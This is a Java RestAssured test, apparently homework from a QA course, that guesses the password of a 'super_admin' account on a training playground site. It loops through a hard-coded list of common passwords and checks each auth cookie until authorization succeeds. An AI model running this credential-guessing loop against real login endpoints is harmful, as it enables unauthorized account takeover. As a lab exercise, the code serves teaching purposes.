import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class testLesson25 {

    private static String check(String login, String passwd, String targetURL){
        String result = null;
        Map<String, String> param = new HashMap<>();
        param.put("login", login);
        param.put("password", passwd);
        Response response = RestAssured
                .given()
                .queryParams(param)
                .when()
                .post(targetURL)
                .andReturn();
        int status = response.getStatusCode();
        if(status == 200){
            result = response.getCookie("auth_cookie");
        }
        return result;
    }

    private static String checkAuth(String cookie, String targetURL){
        Map<String, String> cookies = new HashMap<>();
        cookies.put("auth_cookie", cookie);
        Response response = RestAssured
                .given()
                .cookies(cookies)
                .when()
                .get(targetURL)
                .andReturn();
        return response.asString();
    }

    @Test
    public void Main() {
        String checkURL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String checkAuthURL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        String login = "super_admin";
        String list = "password,123456,123456789,12345678,12345,qwerty,abc123,football,1234567,monkey,111111,letmein,1234,1234567890,dragon,baseball,sunshine,iloveyou,trustno1,princess,adobe123,123123,welcome,login,admin,qwerty123,solo,1q2w3e4r,master,666666,photoshop,1qaz2wsx,qwertyuiop,ashley,mustang,121212,starwars,654321,bailey,access,flower,555555,passw0rd,shadow,lovely,7777777,michael,!@#$%^&*,jesus,password1,superman,hello,charlie,888888,696969,hottie,freedom,aa123456,qazwsx,ninja,azerty,loveme,whatever,donald,batman,zaq1zaq1,0,123qwe";
        String[] passwords = list.split(",");
        for(String password : passwords) {
            String cook = check(login, password, checkURL);
            String res = checkAuth(cook, checkAuthURL);
            if(Objects.equals(res, "You are authorized")) {
                System.out.println("Right password: " + password);
                System.out.println("Server answer: " + res);
                break;
            }
        }
    }
}
